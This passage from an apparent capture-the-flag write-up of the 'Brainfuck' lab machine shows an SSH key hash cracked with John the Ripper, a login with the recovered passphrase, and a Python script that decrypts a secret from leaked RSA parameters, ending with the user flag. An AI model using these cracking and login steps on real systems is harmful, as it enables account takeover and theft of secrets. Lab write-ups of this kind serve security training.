id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# john id_rsa-brainfuck-crack --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH-ng [RSA/DSA 32/32])
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
1g 0:00:00:20 DONE (2018-01-30 13:26) 0.04889g/s 701398p/s 701398c/s 701398C/s *7¡Vamos!
Session completed
root@kali:~/brainfuck#
```

```sh
root@kali:~/brainfuck# chmod 600 id_rsa
root@kali:~/brainfuck# ssh -i id_rsa orestis@brainfuck.htb
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'brainfuck.htb,10.10.10.17' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ ls -l
total 20
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
orestis@brainfuck:~$
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
orestis@brainfuck:~$
```

```sh
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
orestis@brainfuck:~$
```

```sh
orestis@brainfuck:~$ cat debug.txt
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$
```

```sh
orestis@brainfuck:~$ cat output.txt
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
orestis@brainfuck:~$
```

[```RSA given q, p and e?```](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

```sh
orestis@brainfuck:~$ cat decrypt.py
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()

orestis@brainfuck:~$
```

```sh
orestis@brainfuck:~$ python decrypt.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
orestis@brainfuck:~$
```

```sh
orestis@brainfuck:~$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> 
>>> str(hex(pt))
'0x3665666331613564626238393034373531636536353636613330356262386566L'
>>>
>>> str(hex(pt))[2:-1]
'3665666331613564626238393034373531636536353636613330356262386566'
>>>
>>> str(hex(pt))[2:-1].decode('hex')
'6efc1a5dbb8904751ce6566a305bb8ef'
>>>
```

```sh
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9
orestis@brainfuck:~$
```
